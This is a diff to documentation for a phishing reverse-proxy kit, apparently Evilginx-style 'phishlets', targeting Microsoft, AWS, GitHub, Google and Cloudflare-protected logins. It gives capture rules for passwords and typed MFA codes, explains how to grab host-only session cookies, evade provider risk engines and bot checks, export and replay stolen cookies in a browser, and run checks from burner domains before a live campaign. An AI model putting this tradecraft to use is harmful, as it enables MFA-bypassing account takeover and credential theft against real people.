@@ -31,8 +31,8 @@ proxy_hosts:
 credentials:
   username: {key: loginfmt, search: '...', type: post}      # capture rules
   password:  {key: passwd,  search: '...', type: post}
-  custom:
-    - {domain: login.live.com, keys: ['ESTSAUTHPERSISTENT'], type: auth}
+  custom:                                                            # MFA / extra fields
+    - {key: otp, search: '(.*)', type: post}                         # typed TOTP/SMS codes
 login:
   domain: login.microsoftonline.com
 bg_ja4_allow:                       # optional: per-phishlet botguard JA4 exceptions
@@ -65,6 +65,20 @@ auth_tokens:
   the landing page.
 - **Google's `f.req` username capture**: the email lives inside the JSON-RPC array, not a
   plain form field — capture by regex over the POST body.
+- **`login.domain` must be an exact `orig_sub`+`domain` pair from `proxy_hosts`.** The
+  loader validates it (aws lesson: `signin` + `amazon.com` combines to
+  `signin.amazon.com`, but the real host is `signin.aws.amazon.com` — use domain
+  `aws.amazon.com`).
+- **Host-only cookies need a no-dot `auth_tokens` group.** `Set-Cookie` without a
+  `Domain` attribute (every `__Host-*` cookie) lands on the bare hostname and the
+  lookup is exact-string — a `.github.com` group never sees them. GitHub's session
+  cookie is exactly that: `__Host-user_session_same_site` on `github.com`.
+- **Verify the token list against a live login.** Providers change cookies silently —
+  modern GitHub dropped domain-wide `user_session` entirely. Mark non-critical cookies
+  `:opt` so completion cannot hang.
+- **Proxy telemetry hosts, never block them** (`collector.github.com`,
+  `play.google.com/log`, …): blocking looks like a broken client to the provider's
+  risk engine (the Google "browser not secure" lesson).
 
 ## Per-phishlet botguard JA4 exceptions
 
@@ -163,8 +177,19 @@ Detection checks belong on burner domains, never the campaign one.
 ## Testing a phishlet
 
 1. `enable <phishlet>` + fresh lure with token.
-2. Trusted-loopback render (see [troubleshooting](troubleshooting.md)) — the real login
-   flow must appear, not the decoy.
+2. Render **through the lure with `?t=<token>`** in one browser session. Never visit
+   the landing path directly: a direct visit has no session, so POSTs are not
+   monitored (capture silently missing), and a non-allowlisted headless JA4 gets
+   the botguard decoy redirect — which looks exactly like a broken phishlet.
+   The token-gate param is `t`, not `token`.
 3. Walk the whole flow with a test account: identifier → password → MFA → landed app.
+   Push-type MFA (GitHub Mobile) posts no OTP field — `custom: otp` only fires on
+   typed codes; that is expected.
 4. `sessions` shows the capture; `export <id>` and replay the cookies into a real browser.
-5. Only then: detection checks from a burner, and the campaign.
+5. Only then: detection checks from a burner, and the campaign. Pause test lures with
+   `PUT /lures/{id}` `{"paused": <unix-ts>}` — the field is an int64 "pause until"
+   timestamp, not a boolean (`0` resumes).
+
+Cloudflare-protected logins (gitlab, claude, chatgpt) show the CF challenge **on the
+phishing host** for headless browsers — verify with a real browser before declaring
+the phishlet broken.
